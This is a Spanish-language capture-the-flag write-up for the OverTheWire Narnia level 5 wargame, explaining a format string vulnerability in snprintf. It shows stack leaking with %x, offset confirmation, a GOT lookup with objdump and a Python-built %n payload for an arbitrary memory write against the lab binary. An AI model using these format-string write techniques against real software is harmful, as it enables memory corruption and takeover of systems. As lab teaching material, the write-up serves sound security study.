*[Image: banner]*

# `> [NARNIA 5]`

```bash
$ ssh narnia5@narnia.labs.overthewire.org -p 2226

$ echo $TARGET
> snprintf con límite · sin argumento de formato · lectura y escritura arbitraria de pila

$ echo $VECTOR
> format string vulnerability · stack leak con %x · escritura arbitraria con %n
```

---

## `> [RECON]`

```bash
$ cat /narnia/narnia5.c
```

```c
char buffer[64];
snprintf(buffer, sizeof(buffer), argv[1]);
```

El programador pensó que `sizeof(buffer)` era suficiente.
Bloqueó el desbordamiento clásico. 64 bytes. Pared fija.

Dejó abierta la puerta de al lado.

`argv[1]` llega directo como argumento de formato.
Eso no es una cadena de texto para imprimir.
Es un programa que `snprintf` va a ejecutar.

---

## `> [HYPOTHESIS]`

```diff
+ snprintf limita a 64 bytes: el overflow clásico es imposible.
+ sin "%s" explícito, los especificadores de formato en argv[1] se evalúan.
+ %x lee valores de la pila y los imprime en hex.
+ %n escribe en una dirección de memoria el número de bytes impresos hasta ese momento.
+ con el offset correcto, podemos apuntar %n a una dirección que controlamos.
- intenté meter shellcode en 64 bytes. no hay espacio.
- creí que %n solo contaba caracteres. no escribe, controla.
```

---

## `> [ATTEMPTS]`

<details>
<summary><code>// 3l f0rm4t0 n0 3s s4l1d4. 3s 1nput.</code></summary>

```bash
#: intento 1
$ /narnia/narnia5 "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"
# AAAA.56446c6f.ffffd668.56446c00.41414141.78252e78.2e78252e.252e7825.78252e78
# el cuarto bloque: 41414141: equivalente hex de "AAAA".
# nuestro input está en la pila. el offset desde snprintf hasta nuestro buffer es 4.

#: intento 2
# confirmamos el offset con un marcador más claro.
$ /narnia/narnia5 "BBBB.%4\$x"
# BBBB.42424242
# el especificador %4$x accede directamente al cuarto argumento en la pila.
# el cuarto argumento somos nosotros.

#: intento 3
# buscamos una dirección objetivo para sobreescribir.
# opción clásica: una entrada en la GOT (Global Offset Table)
# que se llame después del snprintf.
$ objdump -R /narnia/narnia5
# identificamos la dirección de exit() en la GOT: 0x0804a018 (ejemplo)

#: intento 4
# construcción del payload.
# reemplazamos "BBBB" por la dirección objetivo en little endian.
# usamos %Nc (donde N es un número) para inflar el contador de bytes impresos
# hasta el valor que queremos escribir con %n.
$ /narnia/narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x18\xa0\x04\x08" + b"%4$n")')
# escritura en la dirección objetivo.
```

```txt
offset en pila: 4.
primitiva de escritura arbitraria establecida.
flujo de control modificado.
```

</details>

---

## `> [BREAK]`

La pila durante la ejecución de `snprintf`:

```
direcciones bajas ↓

  [ arg1: format_string ] [ arg2: buffer ] [ arg3: size ] [ arg4: nuestro_input ]
        ↑ argv[1]                                           ↑ 41414141 (AAAA)

direcciones altas ↑
```

El formato no es texto que se imprime.
Es un intérprete que camina la pila leyendo argumentos.

Piensa en esto: como un cajero automático con un teclado roto:
alguien configuró la máquina para que acepte instrucciones en el campo "nombre".
Escribes `%n` donde debería ir tu nombre
y la máquina deposita dinero en la cuenta que tú le dices.
El programador nunca diseñó eso.
Pero tampoco lo bloqueó.

```
[ DIRECCIÓN OBJETIVO (4 bytes) ] [ %ANCHO$n ]
  ↑ la dirección donde queremos   ↑ escribe el contador
    escribir, en la pila           de bytes ahí
```

No rompiste el límite de 64 bytes.
Usaste el motor de formato del sistema para escribir fuera de él.

En 1999, **ProFTPD** tenía exactamente este error en su función de logging.
`syslog()` recibía el input del usuario como argumento de formato.
Acceso root remoto. Sin tocar ningún buffer de tamaño fijo.

> *→ [`/lore/proftp_2000.md`](https://github.com/t474-r0b07/ctf-writeups/tree/main/lore/proftp_2000.md)*

---

## `> [EXPLOIT]`

```bash
# paso 1: confirmar offset
/narnia/narnia5 "AAAA.%x.%x.%x.%x"

# paso 2: identificar dirección objetivo en GOT
objdump -R /narnia/narnia5

# paso 3: construir payload
/narnia/narnia5 $(python3 -c '
import sys
target = b"\x18\xa0\x04\x08"   # dirección en GOT (little endian)
payload = target + b"%4$n"      # %4$n escribe en esa dirección
sys.stdout.buffer.write(payload)
')
```

```
%x              → lee un valor de la pila. imprime en hex.
                   con esto mapeamos dónde estamos en la pila.
%4$x            → acceso directo al cuarto argumento. sin caminar uno por uno.
AAAA → 41414141 → confirmación visual de que nuestro input es el argumento 4.
%n              → escribe el contador de bytes impresos en la dirección apuntada.
                   no imprime nada. actúa.
dirección GOT   → el destino. lo que sobreescribimos para redirigir el flujo.
```

---

## `> [FLAG]`

```
[REDACTED]
```

> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
> 3l pr3m10 n0 3s un str1ng d3 t3xt0.

---

## `> [REFLECTION]`

```diff
+ snprintf con límite no es snprintf seguro. el formato sigue siendo peligroso.
+ %x para mapear la pila. %n para escribir. son dos primitivas distintas.
+ el offset en la pila se confirma visualmente: 41414141 es AAAA.
+ GOT como objetivo: sobreescribir una función que se llama después = control de flujo.
- asumir que el límite de tamaño resuelve el problema → falso. resuelve uno, crea otro.
- creer que %n solo cuenta → no. escribe. y escribe donde tú le dices.
```

---

## `> echo $CHALLENGE`

El programador puso una pared de 64 bytes.
La pared existe. Funciona.
Y no sirve de nada.

Porque el problema nunca fue el tamaño.
Fue dejar que el usuario eligiera el idioma en el que habla la función.

Busca **ProFTPD 1999**.
Busca cómo un string de login comprometía un servidor FTP en producción.
Busca qué diferencia hay entre `syslog(LOG_INFO, input)` y `syslog(LOG_INFO, "%s", input)`.

Un carácter. Un `%s` que alguien no escribió.
Eso es todo lo que separaba el servidor del atacante.

El detalle que nadie revisa es exactamente donde vive la vulnerabilidad.

---

```
█████████████████████████████████████████████
█                                           █
█   3l f0rm4t0 n0 3s s4l1d4.              █
█         3s 3l 1d10m4 d3l 4t4qu3.        █
█                                           █
█████████████████████████████████████████████
```

> *→[https://youtube.com/t474-r0b07](https://youtube.com/@kaderd.garnica?si=9vk1E6Gkkb7LftTK)*
---

> *→ anterior: [narnia4](narnia04.md)**→ siguiente: [narnia6](narnia06.md)*

---
<!-- 0x25 0x6e // 3l qu3 3scr1b3 3l f0rm4t0 3scr1b3 3l d3st1n0. -->
